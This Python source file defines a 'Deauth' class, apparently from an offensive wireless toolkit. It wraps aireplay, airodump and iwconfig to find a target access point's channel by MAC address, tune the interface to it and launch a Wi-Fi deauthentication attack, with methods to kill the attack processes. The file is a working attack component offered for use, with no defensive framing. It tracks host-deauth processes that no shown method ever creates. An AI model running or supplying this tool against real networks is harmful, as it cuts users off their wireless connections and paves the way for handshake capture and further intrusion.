from pandora.shell import aireplay, airodump as airodump_mod, netinfo

class Deauth():
    def __init__(self, airodump=None):
        self.deauth_ap_proc = None
        self.deauth_hosts_procs = []
        self.iwconfig = netinfo.Iwconfig()
        self.aireplay = aireplay.Aireplay()
        if airodump:
            self.airodump = airodump
        else:
            self.airodump = airodump_mod.Airodump()

    def setChannel(self, ifname, channel):
        self.iwconfig.set_channel(ifname, channel)

    def getChannel(self, target_mac):
        return self.airodump.get_ap_channel(target_mac)

    def deauthAP(self, target_mac, ifname, packets=0):
        target_channel = self.getChannel(target_mac)
        self.iwconfig.set_channel(ifname, target_channel)
        self.deauth_ap_proc = self.aireplay.deauth_ap(target_mac, ifname, packets)

    def killDeauthAPProc(self):
        if self.deauth_ap_proc:
            self.deauth_ap_proc.kill()
        self.deauth_ap_proc = None
    
    def killAllProcs(self):
        self.killDeauthAPProc()
        self.killHostsProcs()

    def killHostsProcs(self):
        for host_proc in self.deauth_hosts_procs:
            host_proc.kill()
        self.deauth_hosts_procs = []